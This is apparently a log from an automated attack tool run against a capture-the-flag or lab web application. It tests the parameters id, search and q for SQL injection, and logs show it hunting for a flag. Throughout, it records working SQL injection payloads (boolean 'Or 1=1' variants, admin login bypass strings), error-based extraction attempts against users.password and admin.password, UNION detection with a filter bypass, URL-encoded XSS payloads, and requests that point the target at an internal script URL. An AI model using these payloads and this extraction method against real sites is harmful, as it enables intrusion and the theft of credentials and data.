+2026-10-30 15:50:14,792 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.value...
+2026-10-30 15:50:14,806 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,862 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,891 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,916 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,978 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,008 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,028 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.token...
+2026-10-30 15:50:15,035 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,132 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,175 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,199 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.data...
+2026-10-30 15:50:15,204 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,243 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,270 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,308 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,329 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,348 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.flag...
+2026-10-30 15:50:15,354 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,409 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,437 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,505 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.value...
+2026-10-30 15:50:15,526 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,565 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,591 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,644 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,672 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.token...
+2026-10-30 15:50:15,678 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,730 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,757 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,793 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,818 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.data...
+2026-10-30 15:50:15,824 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,870 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:15,902 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,940 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:15,965 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.secret...
+2026-10-30 15:50:15,970 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:16,010 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:16,102 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.value...
+2026-10-30 15:50:16,242 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.data...
+2026-10-30 15:50:16,388 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.password...
+2026-10-30 15:50:16,540 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.email...
+2026-10-30 15:50:16,699 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.username...
+2026-10-30 15:50:16,833 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.password...
+2026-10-30 15:50:16,973 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.email...
+2026-10-30 15:50:17,097 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.username...
+2026-10-30 15:50:17,237 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 2/5: UNION-based detection (10s)
+2026-10-30 15:50:17,464 - AggressiveSQLiVerifier - INFO - [UNION] ✓ Found 1 columns (no error, stable response)
+2026-10-30 15:50:17,465 - AggressiveSQLiVerifier - INFO - [✓✓✓] UNION-BASED SQLi found!
+2026-10-30 15:50:17,467 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting database version...
+2026-10-30 15:50:17,608 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting current database...
+2026-10-30 15:50:17,672 - AggressiveSQLiVerifier - INFO - [EXTRACT] ✓ Database: API
+2026-10-30 15:50:17,674 - AggressiveSQLiVerifier - INFO - [EXTRACT] Attempting direct data extraction from common tables...
+2026-10-30 15:50:17,675 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flag'...
+2026-10-30 15:50:18,228 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flags'...
+2026-10-30 15:50:18,756 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'jobs'...
+2026-10-30 15:50:19,390 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'posts'...
+2026-10-30 15:50:19,964 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'items'...
+2026-10-30 15:50:20,437 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'users'...
+2026-10-30 15:50:20,990 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'admin'...
+2026-10-30 15:50:21,537 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'secrets'...
+2026-10-30 15:50:22,017 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] UNION found SQLi but no FLAG - continuing to Boolean for auth bypass...
+2026-10-30 15:50:22,019 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3/5: Boolean-based detection (15s)
+2026-10-30 15:50:22,144 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Baseline length: 3320
+2026-10-30 15:50:22,146 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1
+2026-10-30 15:50:22,229 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:22,230 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2
+2026-10-30 15:50:22,312 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:22,314 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1'-- -
+2026-10-30 15:50:22,410 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:22,412 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2'-- -
+2026-10-30 15:50:22,511 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:22,513 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: admin' Or '1'='1'-- -
+2026-10-30 15:50:22,591 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:22,593 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: admin' AnD '1'='2'-- -
+2026-10-30 15:50:22,687 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:22,689 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.5/6: Boolean blind character extraction (30s)
+2026-10-30 15:50:22,691 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Testing character extraction with MID() and ASCII()...
+2026-10-30 15:50:23,413 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] No boolean blind SQLi detected
+2026-10-30 15:50:23,415 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.6/6: General blind extraction from tables (60s)
+2026-10-30 15:50:23,416 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] Starting generalized blind data extraction...
+2026-10-30 15:50:23,418 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] Detecting injection context...
+2026-10-30 15:50:24,462 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] No boolean blind context detected
+2026-10-30 15:50:24,464 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 4/5: Time-based detection (60s)
+2026-10-30 15:50:24,549 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Returning UNION result (no FLAG found but SQLi confirmed)
+2026-10-30 15:50:24,653 - SQLiOrchestrator - INFO - [✓✓✓] AGGRESSIVE MODE: Found union_based SQLi!
+2026-10-30 15:50:24,655 - SQLiOrchestrator - INFO -     Confidence: 75%
+2026-10-30 15:50:24,657 - SQLiOrchestrator - INFO - [✓✓✓] DATA EXTRACTED:
+2026-10-30 15:50:24,660 - SQLiOrchestrator - INFO -     current_database: API
+2026-10-30 15:50:24,663 - SQLiOrchestrator - INFO - ✓ VULNERABLE: id
+2026-10-30 15:50:24,665 - SQLiOrchestrator - INFO -   Type: union_based
+2026-10-30 15:50:24,667 - SQLiOrchestrator - INFO -   Database: unknown
+2026-10-30 15:50:24,669 - SQLiOrchestrator - INFO -   Confidence: 75%
+2026-10-30 15:50:24,670 - SQLiOrchestrator - INFO -   → SQLi found but no FLAG yet - continuing to test other parameters...
+2026-10-30 15:50:24,672 - SQLiOrchestrator - INFO - 
+================================================================================
+2026-10-30 15:50:24,674 - SQLiOrchestrator - INFO - Testing parameter: search
+2026-10-30 15:50:24,675 - SQLiOrchestrator - INFO - ================================================================================
+
+2026-10-30 15:50:24,677 - SQLiOrchestrator - INFO - [AGGRESSIVE TESTING] Fast SQLMap-style testing on search
+2026-10-30 15:50:24,679 - SQLiOrchestrator - INFO -    Mode: AGGRESSIVE (Error→UNION→Boolean→Time)
+2026-10-30 15:50:24,681 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Starting fast SQLMap-style testing on search
+2026-10-30 15:50:24,683 - AggressiveSQLiVerifier - INFO - [BYPASS] Filter bypass enabled: case_mixing
+2026-10-30 15:50:25,698 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 1/5: Error-based detection (2s)
+2026-10-30 15:50:25,700 - AggressiveSQLiVerifier - INFO - [ERROR-BASED] Attempting data extraction via EXTRACTVALUE/UPDATEXML...
+2026-10-30 15:50:25,702 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.flag...
+2026-10-30 15:50:25,942 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.value...
+2026-10-30 15:50:26,166 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.token...
+2026-10-30 15:50:26,391 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.data...
+2026-10-30 15:50:26,566 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.flag...
+2026-10-30 15:50:26,724 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.value...
+2026-10-30 15:50:26,889 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.token...
+2026-10-30 15:50:27,044 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.data...
+2026-10-30 15:50:27,210 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.secret...
+2026-10-30 15:50:27,366 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.value...
+2026-10-30 15:50:27,511 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.data...
+2026-10-30 15:50:27,637 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.password...
+2026-10-30 15:50:27,783 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.email...
+2026-10-30 15:50:27,924 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.username...
+2026-10-30 15:50:28,075 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.password...
+2026-10-30 15:50:28,228 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.email...
+2026-10-30 15:50:28,372 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.username...
+2026-10-30 15:50:28,525 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 2/5: UNION-based detection (10s)
+2026-10-30 15:50:28,752 - AggressiveSQLiVerifier - INFO - [UNION] ✓ Found 1 columns (no error, stable response)
+2026-10-30 15:50:28,754 - AggressiveSQLiVerifier - INFO - [✓✓✓] UNION-BASED SQLi found!
+2026-10-30 15:50:28,755 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting database version...
+2026-10-30 15:50:29,009 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting current database...
+2026-10-30 15:50:29,166 - AggressiveSQLiVerifier - INFO - [EXTRACT] ✓ Database: API
+2026-10-30 15:50:29,168 - AggressiveSQLiVerifier - INFO - [EXTRACT] Attempting direct data extraction from common tables...
+2026-10-30 15:50:29,171 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flag'...
+2026-10-30 15:50:29,953 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flags'...
+2026-10-30 15:50:30,760 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'jobs'...
+2026-10-30 15:50:31,991 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'posts'...
+2026-10-30 15:50:32,704 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'items'...
+2026-10-30 15:50:33,312 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'users'...
+2026-10-30 15:50:34,183 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'admin'...
+2026-10-30 15:50:34,838 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'secrets'...
+2026-10-30 15:50:35,458 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] UNION found SQLi but no FLAG - continuing to Boolean for auth bypass...
+2026-10-30 15:50:35,471 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3/5: Boolean-based detection (15s)
+2026-10-30 15:50:35,754 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Baseline length: 3320
+2026-10-30 15:50:35,759 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1
+2026-10-30 15:50:36,046 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:36,049 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2
+2026-10-30 15:50:36,155 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:36,157 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1'-- -
+2026-10-30 15:50:36,312 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:36,315 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2'-- -
+2026-10-30 15:50:36,433 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:36,436 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: admin' Or '1'='1'-- -
+2026-10-30 15:50:36,552 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:36,554 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: admin' AnD '1'='2'-- -
+2026-10-30 15:50:36,668 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:36,671 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.5/6: Boolean blind character extraction (30s)
+2026-10-30 15:50:36,673 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Testing character extraction with MID() and ASCII()...
+2026-10-30 15:50:37,697 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] No boolean blind SQLi detected
+2026-10-30 15:50:37,700 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.6/6: General blind extraction from tables (60s)
+2026-10-30 15:50:37,703 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] Starting generalized blind data extraction...
+2026-10-30 15:50:37,706 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] Detecting injection context...
+2026-10-30 15:50:39,586 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] No boolean blind context detected
+2026-10-30 15:50:39,588 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 4/5: Time-based detection (60s)
+2026-10-30 15:50:39,678 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Returning UNION result (no FLAG found but SQLi confirmed)
+2026-10-30 15:50:39,769 - SQLiOrchestrator - INFO - [✓✓✓] AGGRESSIVE MODE: Found union_based SQLi!
+2026-10-30 15:50:39,771 - SQLiOrchestrator - INFO -     Confidence: 75%
+2026-10-30 15:50:39,773 - SQLiOrchestrator - INFO - [✓✓✓] DATA EXTRACTED:
+2026-10-30 15:50:39,775 - SQLiOrchestrator - INFO -     current_database: API
+2026-10-30 15:50:39,776 - SQLiOrchestrator - INFO - ✓ VULNERABLE: search
+2026-10-30 15:50:39,778 - SQLiOrchestrator - INFO -   Type: union_based
+2026-10-30 15:50:39,780 - SQLiOrchestrator - INFO -   Database: unknown
+2026-10-30 15:50:39,781 - SQLiOrchestrator - INFO -   Confidence: 75%
+2026-10-30 15:50:39,783 - SQLiOrchestrator - INFO -   → SQLi found but no FLAG yet - continuing to test other parameters...
+2026-10-30 15:50:39,784 - SQLiOrchestrator - INFO - 
+================================================================================
+2026-10-30 15:50:39,785 - SQLiOrchestrator - INFO - Testing parameter: q
+2026-10-30 15:50:39,787 - SQLiOrchestrator - INFO - ================================================================================
+
+2026-10-30 15:50:39,788 - SQLiOrchestrator - INFO - [AGGRESSIVE TESTING] Fast SQLMap-style testing on q
+2026-10-30 15:50:39,790 - SQLiOrchestrator - INFO -    Mode: AGGRESSIVE (Error→UNION→Boolean→Time)
+2026-10-30 15:50:39,791 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Starting fast SQLMap-style testing on q
+2026-10-30 15:50:39,792 - AggressiveSQLiVerifier - INFO - [BYPASS] Filter bypass enabled: case_mixing
+2026-10-30 15:50:40,559 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 1/5: Error-based detection (2s)
+2026-10-30 15:50:40,561 - AggressiveSQLiVerifier - INFO - [ERROR-BASED] Attempting data extraction via EXTRACTVALUE/UPDATEXML...
+2026-10-30 15:50:40,562 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.flag...
+2026-10-30 15:50:40,747 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.value...
+2026-10-30 15:50:40,917 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.token...
+2026-10-30 15:50:41,094 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.data...
+2026-10-30 15:50:41,272 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.flag...
+2026-10-30 15:50:41,431 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.value...
+2026-10-30 15:50:41,587 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.token...
+2026-10-30 15:50:41,762 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.data...
+2026-10-30 15:50:41,930 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.secret...
+2026-10-30 15:50:42,111 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.value...
+2026-10-30 15:50:42,287 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.data...
+2026-10-30 15:50:42,483 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.password...
+2026-10-30 15:50:42,660 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.email...
+2026-10-30 15:50:42,860 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.username...
+2026-10-30 15:50:43,035 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.password...
+2026-10-30 15:50:43,204 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.email...
+2026-10-30 15:50:43,364 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.username...
+2026-10-30 15:50:43,522 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 2/5: UNION-based detection (10s)
+2026-10-30 15:50:43,736 - AggressiveSQLiVerifier - INFO - [UNION] ✓ Found 1 columns (no error, stable response)
+2026-10-30 15:50:43,738 - AggressiveSQLiVerifier - INFO - [✓✓✓] UNION-BASED SQLi found!
+2026-10-30 15:50:43,739 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting database version...
+2026-10-30 15:50:43,902 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting current database...
+2026-10-30 15:50:43,972 - AggressiveSQLiVerifier - INFO - [EXTRACT] ✓ Database: API
+2026-10-30 15:50:43,974 - AggressiveSQLiVerifier - INFO - [EXTRACT] Attempting direct data extraction from common tables...
+2026-10-30 15:50:43,976 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flag'...
+2026-10-30 15:50:44,503 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flags'...
+2026-10-30 15:50:45,058 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'jobs'...
+2026-10-30 15:50:45,610 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'posts'...
+2026-10-30 15:50:46,095 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'items'...
+2026-10-30 15:50:46,700 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'users'...
+2026-10-30 15:50:47,485 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'admin'...
+2026-10-30 15:50:48,323 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'secrets'...
+2026-10-30 15:50:48,799 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] UNION found SQLi but no FLAG - continuing to Boolean for auth bypass...
+2026-10-30 15:50:48,804 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3/5: Boolean-based detection (15s)
+2026-10-30 15:50:48,923 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Baseline length: 3320
+2026-10-30 15:50:48,926 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1
+2026-10-30 15:50:49,018 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:49,020 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2
+2026-10-30 15:50:49,114 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:49,116 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1'-- -
+2026-10-30 15:50:49,210 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:49,212 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2'-- -
+2026-10-30 15:50:49,331 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:49,334 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: admin' Or '1'='1'-- -
+2026-10-30 15:50:49,441 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 3320
+2026-10-30 15:50:49,444 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: admin' AnD '1'='2'-- -
+2026-10-30 15:50:49,551 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 3320
+2026-10-30 15:50:49,554 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.5/6: Boolean blind character extraction (30s)
+2026-10-30 15:50:49,556 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Testing character extraction with MID() and ASCII()...
+2026-10-30 15:50:50,609 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] No boolean blind SQLi detected
+2026-10-30 15:50:50,611 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.6/6: General blind extraction from tables (60s)
+2026-10-30 15:50:50,614 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] Starting generalized blind data extraction...
+2026-10-30 15:50:50,615 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] Detecting injection context...
+2026-10-30 15:50:51,749 - AggressiveSQLiVerifier - INFO - [BLIND-EXTRACT] No boolean blind context detected
+2026-10-30 15:50:51,752 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 4/5: Time-based detection (60s)
+2026-10-30 15:50:51,845 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Returning UNION result (no FLAG found but SQLi confirmed)
+2026-10-30 15:50:51,954 - SQLiOrchestrator - INFO - [✓✓✓] AGGRESSIVE MODE: Found union_based SQLi!
+2026-10-30 15:50:51,956 - SQLiOrchestrator - INFO -     Confidence: 75%
+2026-10-30 15:50:51,958 - SQLiOrchestrator - INFO - [✓✓✓] DATA EXTRACTED:
+2026-10-30 15:50:51,960 - SQLiOrchestrator - INFO -     current_database: API
+2026-10-30 15:50:51,962 - SQLiOrchestrator - INFO - ✓ VULNERABLE: q
+2026-10-30 15:50:51,964 - SQLiOrchestrator - INFO -   Type: union_based
+2026-10-30 15:50:51,966 - SQLiOrchestrator - INFO -   Database: unknown
+2026-10-30 15:50:51,968 - SQLiOrchestrator - INFO -   Confidence: 75%
+2026-10-30 15:50:51,970 - SQLiOrchestrator - INFO -   → SQLi found but no FLAG yet - continuing to test other parameters...
